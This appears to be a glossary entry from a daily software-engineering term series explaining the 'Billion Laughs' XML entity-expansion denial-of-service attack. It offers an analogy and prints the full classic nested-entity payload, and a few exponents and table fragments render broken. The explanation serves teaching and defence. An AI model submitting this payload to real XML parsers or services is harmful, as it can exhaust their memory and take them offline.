---
title: "The \"Billion Laughs\" Attack"
termSlug: "the-billion-laughs-attack"
year: 2026
month: 4
monthName: "April"
day: 30
order: 20
source: "2026/apr-term.md"
sourceUrl: "https://github.com/swegrowthid/daily-term-SE-Growth/blob/main/2026/apr-term.md"
excerpt: "A Billion Laughs Attack is a type of Denial-of-Service (DoS) attack that exploits an XML parser’s entity expansion feature. An attacker submits a very small XML document that defines nested entitie..."
---
### Definition:

A Billion Laughs Attack is a type of Denial-of-Service (DoS) attack that exploits an XML parser’s entity expansion feature. An attacker submits a very small XML document that defines nested entities referencing one another. When the parser resolves these references, the data expands exponentially—often from a few kilobytes to gigabytes of memory—overwhelming the system and causing a crash.

Simple Analogy
Imagine a set of Russian nesting dolls, but with a twist:

Doll #1 contains 10 Doll #2s.
Each Doll #2 contains 10 Doll #3s.
...and so on for just 9 layers.
By the time you open the last layer, you suddenly have 10 
9
  (one billion) tiny dolls, even though the original box was small. The XML parser is the person opening every single doll.

### Example:

```
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>

	...
lol9	&lol8; × 10	10 
9
  (1 billion)
The final <lolz>&lol9;</lolz> expands to 1 billion copies of the text lol. At roughly 3 bytes per “lol” plus overhead, the parser must materialize several gigabytes in memory from a file smaller than 1 KB.
```
